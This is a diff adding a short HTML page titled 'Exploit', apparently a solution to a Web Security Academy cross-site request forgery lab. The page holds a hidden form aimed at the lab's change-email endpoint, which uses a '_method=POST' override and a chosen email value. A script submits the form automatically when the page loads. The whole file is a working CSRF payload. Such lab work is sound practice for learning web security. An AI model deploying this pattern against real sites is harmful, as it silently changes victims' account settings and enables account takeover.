@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Exploit</title>
+</head>
+<body>
+Hello World !
+
+<form name="csrfForm"  method="GET"
+	action="https://0a40001403f5c14dc114f1c400890038.web-security-academy.net/my-account/change-email">
+	<input type="hidden" name="_method" value="POST">
+	<input type="hidden" name="email" value="john@doe.com">
+</form>
+
+<script type="text/javascript">
+	document.csrfForm.submit();
+</script>
+
+</body>
+</html>
